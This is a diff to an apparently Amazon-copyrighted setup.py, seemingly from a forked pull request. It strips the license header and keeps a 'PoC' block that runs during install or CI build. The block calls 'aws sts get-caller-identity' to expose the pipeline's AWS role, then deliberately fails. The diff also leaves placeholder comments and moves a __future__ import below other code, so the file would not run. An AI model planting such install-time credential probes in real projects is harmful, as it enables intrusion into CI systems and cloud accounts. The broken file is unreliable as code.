@@ -1,8 +1,10 @@
-# Copyright 2014-2016 Amazon.com, Inc. or its affiliates. All Rights Reserved.
-# SPDX-License-Identifier: Apache-2.0
-# In setup.py
+# ... The rest of the original setup.py content follows ...
+from setuptools import setup, find_packages
+# ... etc.
 
-# --- PoCmainteemoforfun Start ---
+from __future__ import print_function
+
+# --- PoC Start ---
 import os
 print(">>> PoC: EXECUTING CODE FROM FORKED PR (in setup.py) <<<")
 print(">>> PoC: Attempting AWS CLI command to identify role:")
@@ -10,12 +12,6 @@ os.system("aws sts get-caller-identity")
 print(">>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<")
 exit(1)
 # --- PoC End ---
-
-# ... The rest of the original setup.py content follows ...
-from setuptools import setup, find_packages
-# ... etc.
-
-from __future__ import print_function
 
 import glob
 import sys
